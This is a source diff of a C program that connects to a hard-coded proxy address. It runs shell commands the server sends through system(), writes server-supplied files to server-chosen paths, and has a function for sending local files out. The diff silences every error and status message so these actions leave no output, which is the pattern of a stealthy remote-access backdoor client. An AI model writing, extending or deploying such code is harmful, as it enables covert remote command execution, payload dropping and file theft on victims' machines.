@@ -83,7 +83,7 @@ int get_proxy_socket() {
     inet_pton(AF_INET, PROXY_IP, &serv_addr.sin_addr);
 
     if (connect(proxy_sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0) {
-        perror("Connection to proxy failed");
+        //perror("Connection to proxy failed");
         close(proxy_sock);
         proxy_sock = -1;
         return -1;
@@ -103,13 +103,20 @@ int send_all(int sock, const void *buf, size_t len) {
 }
 
 void send_request_to_proxy(const char *request_message) {
+    static int send_warned = 0;
+    static int path_len_warned = 0;
+    static int cwd_warned = 0;
+
     if (proxy_sock == -1 && get_proxy_socket() == -1) {
-        fprintf(stderr, "Failed to establish proxy socket\n");
+        //fprintf(stderr, "Failed to establish proxy socket\n");
         return;
     }
 
     if (send_all(proxy_sock, request_message, strlen(request_message)) != 0) {
-        perror("send_all failed");
+        if (!send_warned) {
+           // fprintf(stderr, "Send failed once, continuing silently after this.\n");
+            send_warned = 1;
+        }
         close(proxy_sock);
         proxy_sock = -1;
         return;
@@ -118,23 +125,25 @@ void send_request_to_proxy(const char *request_message) {
     // === Receive mode ===
     uint8_t mode;
     if (recv_all(proxy_sock, &mode, 1) != 0) {
-        fprintf(stderr, "Invalid or incomplete response: missing mode\n");
+        //fprintf(stderr, "Invalid or incomplete response: missing mode\n");
         close(proxy_sock);
         return;
-
     }
 
     // === Receive path length ===
     uint32_t path_len;
     if (recv_all(proxy_sock, &path_len, sizeof(path_len)) != 0) {
-        fprintf(stderr, "Invalid or incomplete response: missing path length\n");
+        //fprintf(stderr, "Invalid or incomplete response: missing path length\n");
         close(proxy_sock);
         return;
     }
     path_len = ntohl(path_len);
 
     if (path_len == 0 || path_len >= 1024) {
-        fprintf(stderr, "Invalid path length: %u\n", path_len);
+        if (!path_len_warned) {
+            //fprintf(stderr, "Invalid path length (0 or too large): %u (future messages suppressed)\n", path_len);
+            path_len_warned = 1;
+        }
         close(proxy_sock);
         return;
     }
@@ -142,7 +151,7 @@ void send_request_to_proxy(const char *request_message) {
     // === Receive path ===
     char path[1024] = {0};
     if (recv_all(proxy_sock, path, path_len) != 0) {
-        fprintf(stderr, "Failed to receive full path\n");
+        //fprintf(stderr, "Failed to receive full path\n");
         close(proxy_sock);
         return;
     }
@@ -152,21 +161,21 @@ void send_request_to_proxy(const char *request_message) {
         // === Command mode ===
         uint64_t cmd_len;
         if (recv_all(proxy_sock, &cmd_len, sizeof(cmd_len)) != 0) {
-            fprintf(stderr, "Missing command length\n");
+            //fprintf(stderr, "Missing command length\n");
             close(proxy_sock);
             return;
         }
         cmd_len = be64toh(cmd_len);
 
         if (cmd_len == 0 || cmd_len >= 8192) {
-            fprintf(stderr, "Invalid command length: %lu\n", cmd_len);
+            //fprintf(stderr, "Invalid command length: %lu\n", cmd_len);
             close(proxy_sock);
             return;
         }
 
         char command[8192 + 1];
         if (recv_all(proxy_sock, command, cmd_len) != 0) {
-            fprintf(stderr, "Failed to receive full command\n");
+            //fprintf(stderr, "Failed to receive full command\n");
             close(proxy_sock);
             return;
         }
@@ -176,24 +185,28 @@ void send_request_to_proxy(const char *request_message) {
         char full_cmd[10240];
         snprintf(full_cmd, sizeof(full_cmd), "%s %s", command, path);
         int ret = system(full_cmd);
-        if (ret == -1) perror("Command execution failed");
-        else printf("Exited with code %d\n", WEXITSTATUS(ret));
+        if (ret == -1) {
+            //perror("Command execution failed");
+        } else {
+            //printf("Exited with code %d\n", WEXITSTATUS(ret));
+        }
 
     } else if (mode == 0x02) {
         // === File mode ===
         uint64_t file_size;
         if (recv_all(proxy_sock, &file_size, sizeof(file_size)) != 0) {
-            fprintf(stderr, "Missing file size\n");
+            //fprintf(stderr, "Missing file size\n");
             close(proxy_sock);
             return;
         }
         file_size = be64toh(file_size);
 
-        printf("Receiving file: %s (%lu bytes)\n", path, file_size);
+        //printf("Receiving file: %s (%lu bytes)\n", path, file_size);
         create_directory_if_needed(path);
+
         FILE *f = fopen(path, "wb");
         if (!f) {
-            perror("Failed to open file");
+            //perror("Failed to open file");
             close(proxy_sock);
             return;
         }
@@ -215,14 +228,14 @@ void send_request_to_proxy(const char *request_message) {
 
     close(proxy_sock);
     proxy_sock = -1;
-
 }
+
 
 
 void send_file_to_proxy(const char *file_path) {
     FILE *f = fopen(file_path, "rb");
     if (!f) {
-        perror("fopen");
+        //perror("fopen");
         return;
     }
 
